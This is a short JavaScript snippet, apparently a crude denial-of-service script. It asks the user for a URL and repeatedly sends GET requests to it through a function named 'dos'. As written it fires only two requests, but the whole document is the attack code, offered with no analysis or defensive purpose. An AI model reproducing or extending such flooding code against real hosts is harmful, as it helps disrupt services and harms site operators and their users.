url = prompt("Url: ");
function dos(url){
var xhr = new XMLHttpRequest();
xhr.open('GET',"//"+url, true);
xhr.send();
}
dos(url)
dos(url)

